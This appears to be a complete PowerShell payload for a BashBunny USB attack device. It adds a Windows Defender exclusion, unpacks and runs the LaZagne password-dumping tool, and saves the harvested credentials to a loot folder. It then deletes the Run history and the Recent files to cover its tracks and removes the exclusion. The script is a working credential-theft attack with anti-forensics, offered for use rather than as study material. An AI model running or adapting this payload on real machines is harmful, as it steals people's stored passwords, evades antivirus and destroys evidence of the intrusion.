#############################################
#		CONFIGURATION		    #
#############################################

# Define ExeArguments here (all -vv is default):
$ExeArgs = "all -vv"

# Define loot folder name here (hostname is default):
$foldername = "$env:computername"

# Define loot file name here (hostname is default):
$filename = "$env:computername"



#######################################################
#			PAYLOAD			      #
#######################################################

# Define variable for the driveletter of the BashBunny
$BashBunnyLabel = (gwmi -class win32_volume -f {label = "BASHBUNNY"}).DriveLetter

# Add antivirus exclusion for the whole BashBunny
Add-MpPreference -ExclusionPath "$BashBunnyLabel"

# Unzip lazagne.zip
Expand-Archive -Force $BashBunnyLabel\lazagne.zip $BashBunnyLabel\lazagne

# Define variable for the path to LaZagne + execution arguments
$LazagnePath = & $BashBunnyLabel\lazagne\lazagne.exe $ExeArgs

# Create the loot folder in the "\loot\lazassword\" directory
New-Item -ItemType Directory -Force -Path $BashBunnyLabel\loot\lazassword\$foldername

# Define variable for the loot file
$lootfile = "$BashBunnyLabel\loot\lazassword\$foldername\$filename.txt"

# Execute LaZagne and save the output in the loot file
$LazagnePath | Out-File -FilePath $lootfile

# Delete the run (win+r) history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Remove the unzipped LaZagne folder
Remove-Item "$BashBunnyLabel\lazagne\" -recurse

# Remove the antivirus exclusion for the BashBunny
Remove-MpPreference -ExclusionPath "$BashBunnyLabel"

# Delete the "recent files" reference
Get-ChildItem -Path C:\Users\\$env:UserName\AppData\Roaming\Microsoft\Windows\Recent -Include * -File -Recurse | foreach { $_.Delete()}

# Send the finished message to the BashBunny
\\172.16.64.1\lazassword